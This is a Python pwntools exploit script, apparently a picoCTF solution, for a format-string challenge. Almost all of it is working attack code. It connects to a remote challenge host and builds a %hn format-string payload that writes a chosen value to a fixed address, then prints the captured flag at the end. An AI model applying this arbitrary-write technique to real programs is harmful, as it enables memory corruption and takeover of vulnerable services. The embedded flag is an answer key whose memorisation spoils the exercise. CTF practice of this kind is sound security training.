#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mimas.picoctf.net --port 64602 ./format-string-1
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'rhea.picoctf.net' 
port = int(args.PORT or 51014)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#tbreak main
b *0x401255
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
io.recvuntil('What do you have to say?')

"""
payload = ''
for i in range(10, 20):
    payload += f'%{i}$p|'
"""
SUS_ADDR=0x404060
VALUE_TO_WRITE=0x67616c66
FIRST=VALUE_TO_WRITE&0xFFFF
SEC=VALUE_TO_WRITE>>16

#payload = b'%1734437990c____'
payload = f'%{SEC}c'.encode()
payload += b'%18$hn'
payload += f'%{FIRST-SEC}c'.encode()
payload += b'%19$hn'
payload = fit({0: payload}, length=32, filler=b'_')
payload += p64(SUS_ADDR+2)
payload += p64(SUS_ADDR)
print(payload)
io.sendline(payload)

io.interactive()

#picoCTF{f0rm47_57r?_f0rm47_m3m_99fd82cd}